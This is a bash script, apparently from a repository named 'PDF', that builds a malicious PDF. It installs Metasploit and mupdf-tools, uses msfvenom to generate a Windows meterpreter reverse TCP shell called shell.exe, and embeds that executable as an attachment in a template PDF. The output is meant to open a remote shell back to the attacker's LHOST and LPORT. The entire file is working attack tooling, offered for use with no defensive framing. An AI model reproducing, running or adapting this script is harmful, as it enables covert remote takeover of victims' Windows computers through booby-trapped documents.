#!/bin/bash
set -e

# Usage: ./generate_and_embed_windows_payload.sh <LHOST> <LPORT> <PDF_TEMPLATE_PATH> <OUTPUT_PDF>
OWNER="besthathacker"
REPO="PDF"
LHOST="$1"
LPORT="$2"
PDF_TEMPLATE="$3"
OUTPUT_PDF="$4"
PAYLOAD_NAME="shell.exe"

if [ -z "$LHOST" ] || [ -z "$LPORT" ] || [ -z "$PDF_TEMPLATE" ] || [ -z "$OUTPUT_PDF" ]; then
  echo "Usage: $0 <LHOST> <LPORT> <PDF_TEMPLATE_PATH> <OUTPUT_PDF>"
  exit 1
fi

if [ ! -f "$PDF_TEMPLATE" ]; then
  echo "Template PDF $PDF_TEMPLATE not found!"
  exit 2
fi

# Step 0: Install dependencies if not present
echo "[*] Installing dependencies (requires sudo)..."
if ! command -v msfvenom &> /dev/null; then
  sudo apt-get update
  sudo apt-get install -y metasploit-framework
fi

if ! command -v mutool &> /dev/null; then
  sudo apt-get update
  sudo apt-get install -y mupdf-tools
fi

# Step 1: Generate a Windows reverse shell payload with msfvenom
echo "[*] Generating Windows payload with msfvenom..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$PAYLOAD_NAME"

# Step 2: Embed the EXE as an attachment in the template PDF using mutool
echo "[*] Embedding payload in PDF..."
mutool attach "$PDF_TEMPLATE" "$OUTPUT_PDF" "$PAYLOAD_NAME"

echo "Success: $OUTPUT_PDF created using $PDF_TEMPLATE with $PAYLOAD_NAME embedded."
echo "Owner: $OWNER"
echo "Repository: $REPO"